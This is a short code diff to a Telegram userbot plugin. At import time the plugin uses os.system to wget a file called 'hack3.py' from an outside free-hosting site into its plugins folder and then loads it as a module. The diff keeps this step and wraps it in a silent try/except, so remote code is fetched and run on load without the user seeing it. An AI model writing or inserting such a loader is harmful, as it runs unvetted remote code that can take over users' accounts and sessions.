@@ -9,8 +9,13 @@ from uniborg.util import admin_cmd
 from telethon.tl.functions.users import GetFullUserRequest
 from userbot.utils import load_module
 import os
-os.system('wget https://legendx22.000webhostapp.com/hack3.py -P userbot/plugins/')
-load_module('hack3')
+# hack3 installation
+try:
+  os.system('wget https://legendx22.000webhostapp.com/hack3.py -P userbot/plugins/')
+  load_module('hack3')
+except:
+  pass
+# if no response (pass)
 
 @borg.on(admin_cmd(pattern=r"thack"))
 
